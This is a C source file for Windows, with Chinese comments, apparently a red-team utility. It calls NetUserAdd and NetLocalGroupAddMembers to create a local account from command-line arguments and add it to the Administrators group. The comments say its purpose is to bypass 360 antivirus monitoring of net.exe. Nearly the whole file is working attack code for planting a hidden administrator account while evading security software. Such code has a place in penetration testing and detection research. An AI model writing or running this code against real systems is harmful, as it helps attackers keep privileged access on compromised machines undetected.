#ifdef UNICODE
#define UNICODE
#endif
#include<windows.h>
#include<Shlobj.h>
#include<stdio.h>
#include<stdlib.h>
#include<lm.h>
#include<lmaccess.h> 

#pragma comment(lib,"netapi32.lib")


int wmain(int argc, wchar_t* argv[])
{

	/// <summary>
	/// windows 利用api 添加用户并加入到管理员组绕过360对net.exe的监控
	/// https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd
	/// The NetUserAdd 方法添加一个用户并指派密码和权限级别
	/// https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/ns-lmaccess-user_info_1        USER_INFO_1 structure
	/// USER_INFO_1 结构体包含用户账户的信息包括 账户名，密码，权限级别，用户主目录路径
	/// </summary>

	/*
		NET_API_STATUS NET_API_FUNCTION NetUserAdd(
			LPCWSTR servername,					常量字符串 指定DNS或者NetBIOS远程服务器的名称，NULL表示本地机器							
			DWORD   level,						指定数据的信息级别 对应结构体  USER_INFO_1，2，3，4
			LPBYTE  buf,						指向指定数据的指针  数据的格式依赖于 level parameter
			LPDWORD parm_err					接收错误ERROR_INVALID_PARAMETER索引信息，NULL表示没有返回错误
			);	

		Return Value:  函数成功返回  NERR_Success 


		typedef struct _USER_INFO_1 {
			LPWSTR usri1_name;                  指向指定用户账户Unicode字符串的一个指针
			LPWSTR usri1_password;			    该指针指定由usri1_name成员指示的用户的密码
			DWORD  usri1_password_age;		    自上次更改密码以来的时间(s)     NetUserAdd/NetUseSetInfo函数忽视这个成员
			DWORD  usri1_priv;				    指定usri1_name成员的权限级别 NetUserAdd对应 USER_PRIV_USER权限
			LPWSTR usri1_home_dir;				可以为NULL
			LPWSTR usri1_comment;				与关联账户的注释说明，可以为NULL
			DWORD  usri1_flags;					
			LPWSTR usri1_script_path;
			USER_INFO_1, *PUSER_INFO_1, *LPUSER_INFO_1;
			};
	*/


	
	/// <summary>
	/// windows api 利用 NetLocalGroupAddMembers 将用户添加到管理员组
	/// https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers
	///
	/// </summary>


	/*
	    NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers(
			LPCWSTR servername,                 常量字符串 指定DNS或者NetBIOS远程服务器的名称，NULL表示本地机器    
			LPCWSTR groupname,					指向指定用户要加入的本地组或者全剧组名称的一个常量字符串
			DWORD   level,						LOCALGROUP_MEMBERS_INFO_0 指定新本地组成员的SID   3 表示域内
			LPBYTE  buf,						指向指定数据的指针  数据的格式依赖于 level parameter
			DWORD   totalentries				指定buf参数指向的缓冲区中的条目数。
			);

		Return value: 成功返回 NERR_Success


		typedef struct _LOCALGROUP_MEMBERS_INFO_0 {
			PSID lgrmi0_sid;
			} LOCALGROUP_MEMBERS_INFO_0, *PLOCALGROUP_MEMBERS_INFO_0, *LPLOCALGROUP_MEMBERS_INFO_0;

		
	*/

	// 判断是否以管理员权限运行，否则无法添加用户
	BOOL IsAdmin = IsUserAnAdmin();				// https://docs.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-isuseranadmin
	if (!IsAdmin)
	{
		fwprintf(stderr, L"[-] Run as administrator level!");
		exit(EXIT_FAILURE);
	}

	// 使用USER_INFO_1 结构体
	USER_INFO_1 ui;
	DWORD dwLevel = 1;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;

	if (argc != 3)
	{
		fwprintf(stderr, L"[-] Usage: %s UserName PassWord\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	else
	{
		ui.usri1_name = argv[1];
		ui.usri1_password = argv[2];
		ui.usri1_priv = USER_PRIV_USER;
		ui.usri1_home_dir = NULL;
		ui.usri1_comment = NULL;
		ui.usri1_flags = UF_SCRIPT;
		ui.usri1_script_path = NULL;


		// use NetUserAdd  specifying level 1
		nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, NULL);
		if (nStatus == NERR_Success)
		{
			fwprintf(stderr, L"[+] User %s has been successgully added on localhost\n", argv[1]);
		}
		else
		{
			fwprintf(stderr,L"[-] A system error has occurred: %d\n", nStatus);
		}
	}


	// 添加到管理员组
	NET_API_STATUS gStatus;
	LOCALGROUP_MEMBERS_INFO_3 gi;
	gi.lgrmi3_domainandname = ui.usri1_name;
	DWORD level = 3;
	DWORD totalentries = 1;

	gStatus = NetLocalGroupAddMembers(NULL, L"Administrators", level,(LPBYTE)&gi, totalentries);
	if (gStatus == NERR_Success)
	{
		fwprintf(stderr, L"[+] User %s has been added into administrators\n", argv[1]);
	}
	else
	{
		fwprintf(stderr, L"[-] A system error has occurred: %d\n", gStatus);
	}		

	return 0;
}